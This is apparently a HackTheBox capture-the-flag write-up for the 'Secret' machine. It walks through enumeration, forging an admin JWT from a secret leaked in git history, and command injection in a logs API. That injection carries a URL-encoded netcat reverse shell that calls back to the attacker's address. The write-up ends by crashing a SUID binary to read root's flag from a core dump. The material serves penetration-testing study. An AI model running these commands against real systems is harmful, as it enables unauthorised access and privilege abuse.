---
title: "Secret"
date: 2022-09-20T15:03:31+01:00
draft: false
categories:
  - HackTheBox
---

## Enumeration

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci

80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: DUMB Docs
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
api                     [Status: 200, Size: 93, Words: 12, Lines: 1]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11]
download                [Status: 301, Size: 183, Words: 7, Lines: 11]
docs                    [Status: 200, Size: 0, Words: 1, Lines: 1]
```

Just a web and ssh server...so let's visit the website and see what we can find
we can read docs about an api and download their source code..lol ok
There is a git repository in the source code folder...`gitTools` can extract everything

`git show` on initial commit (use `git log` first to see all commits)

```bash
git show 55fe756a29268f9b4e786ae468952ca4a8df1bd8
commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date: Fri Sep 3 11:25:52 2021 +0530

first commit

diff --git a/.env b/.env
new file mode 100644
index 0000000..fb6f587
--- /dev/null
+++ b/.env
@@ -0,0 +1,2 @@
+DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
diff --git a/.env.swp b/.env.swp
...
```

we can see a `secret token` here

`auth.js` show a `'register'` endpoint of API

`curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/register --data '{"test": "test"}'`

And the response was

```bash
- Connection #0 to host 10.10.11.120 left intact
  "name" is required
```

Analyzig the code we see it requires a name, email and password

```bash
    //create a user
    const user = new User({
        name: req.body.name,
        email: req.body.email,
        password:hashPaswrod
    });
```

so lets create one

`curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/register --data '{"name": "nairolf","email":"nairolf@mail.com","password":"nairolf"}'`

which works fine

```bash
Connection #0 to host 10.10.11.120 left intact
{"user":"nairolf"}
```

lets login

`curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120/api/user/login --data '{"email":"nairolf@mail.com","password":"nairolf"}'`

```bash
Connection #0 to host 10.10.11.120 left intact
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoibmFpcm9sZiIsImVtYWlsIjoibmFpcm9sZkBtYWlsLmNvbSIsImlhdCI6MTYzNjcyNTc0OX0.ey0C8-YyWb6Ke5ZjsjkxJlIMCsjzyAaU7ELI3GosBWA
```

we get a token...a jwt token, in the `verifytoken.js` it goes in the header to access `/priv` route (`priv.js`)

```bash
curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoibmFpcm9sZiIsImVtYWlsIjoibmFpcm9sZkBtYWlsLmNvbSIsImlhdCI6MTYzNjcyNTc0OX0.ey0C8-YyWb6Ke5ZjsjkxJlIMCsjzyAaU7ELI3GosBWA'
{"role":{"role":"you are normal user","desc":"nairolf"}}
```

oh okay..normal user, that's offensive I demand to see the manager (\*karen's noises)

In `private.js` you see how admin token is given

```js
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin",
                username:"theadmin",
                desc : "welcome back admin,"
            }
```

pretty simple...we just have to be `"theadmin"`

we analyze the token with `jwt_tool`

`python jwt_tool.py ...the_long_token_goes_here...`

```bash
=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] \_id = "618e73d81433dd045a64902b"
[+] name = "nairolf"
[+] email = "nairolf@mail.com"
[+] iat = 1636725749 ==> TIMESTAMP = 2021-11-12 15:02:29 (UTC)

---

JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore

---
```

we can also forge ours from that

`python jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoibmFpcm9sZiIsImVtYWlsIjoibmFpcm9sZkBtYWlsLmNvbSIsImlhdCI6MTYzNjcyNTc0OX0.ey0C8-YyWb6Ke5ZjsjkxJlIMCsjzyAaU7ELI3GosBWA`

Basically we inject in our jwt-token, username "theadmin", secret token as password, with signature hs256 that we identified in `jwt_tool`

```bash
jwttool_2e65191b6ac8e06c39c25251292b9a05 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA
```

We use the crafted token to login

`curl http://10.10.11.120/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA'`

```bash
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

Now we are admin...in `private.js` there was a `/logs` route only accessible when logged as admin

it takes a `file` parameter

`curl http://10.10.11.120/api/logs?file=/etc/passwd -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA' {"killed":false,"code":128,"signal":null,"cmd":"git log --oneline /etc/passwd"}`

From the error we understand it takes commands

we can enclose that to do our command injection after file=;

`curl 'http://10.10.11.120/api/logs?file=;id' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA'`

```bash
"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

so we can add a netcat shell there

And...we have to url-encode it (AS URL COMPONENT)

`curl 'http://10.10.11.120/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.81%202311%20%3E%2Ftmp%2Ff' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNzNkODE0MzNkZDA0NWE2NDkwMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im5haXJvbGZAbWFpbC5jb20iLCJpYXQiOjE2MzY3MjU3NDl9.kbtZV2Fwg29cQVysZAG-szxpwZiRPBTAIlKAnf40svA'`

Then we are in

```bash
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

FLAG ONE

`$ cat user.txt`

## Privilege Escalation

`sudo -l` doesnt work...we need creds

Next move if finding SUID binaries

`$ find / -type f -perm -u=s 2>/dev/null`

```bash
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
```

what is `/opt/count`??

```bash
dasith@secret:/opt$ ls
code.c
count
valgrind.log
```

ok lets look at `code.c`

`$ cat /opt/code.c`

I copied the code output in a file with same name for readability
Basically its just a program to count directories and files...
Note this privesc was a true nightmare XD...after hours of suffering I just went to google a helping writeup/forum

A guy was able to read `root.txt` by crashing the binary and reading its dump strings
sounds kinda complex workaround...we need two shells so we run our curl payload again on another port (4444)
In shell 1: we run the SUID binary

```bash
$ cd /opt
$ ./count -p
/root/root.txt
y
```

I wait before pressing 'enter' and go to shell 2:

```bash
$ ps -aux | grep count
root 841 0.0 0.1 235668 7428 ? Ssl 16:11 0:00 /usr/lib/accountsservice/accounts-daemon
dasith 1394 0.0 0.0 2488 520 ? S 16:24 0:00 ./count -p
dasith 1680 0.0 0.0 6432 672 ? S 16:25 0:00 grep count
```

I prepare my kill command and to shell 1 I run the counter

`$ kill -BUS 1394`

Mid-running I crash the bus and back to shell 1 I get a response

```bash
Bus error (core dumped)
```

we then go look for the dumps

```bash
$ cd /var/crash
$ ls
\_opt_count.0.crash
\_opt_count.1000.crash
\_opt_countzz.0.crash
```

we unpack count.1000 in a temporary folder

```bash
$ mkdir /tmp/crashlogs
$ apport-unpack \_opt_count.1000.crash /tmp/crashlogs
```

we go get our logs

```bash
$ cd /tmp/crashlogs
$ ls
Architecture
CoreDump
Date
DistroRelease
ExecutablePath
ExecutableTimestamp
ProblemType
ProcCmdline
ProcCwd
ProcEnviron
ProcMaps
ProcStatus
Signal
Uname
UserGroups
```

we can only read the strings of CoreDump so cat isnt useful here

`$ strings CoreDump`

```bash
...
Enter source file/directory name:
Total characters = 33
Total words = 2
Total lines = 2
Save results a file? [y/N]: Path:
oot/root.txt
Here_you_can_see_root_txt_content
aliases
...
```

Now let's think about all this...we couldn't get a root shell here...
it was more a workaround to get the root flag.

This is definitely not an easy machine...maybe medium...
not too hard too but NOT EASY.
seems like we can access dasith ssh keys...But I could not crack it yet...
We technically do not own this machine so keep exploring for ways to get root.
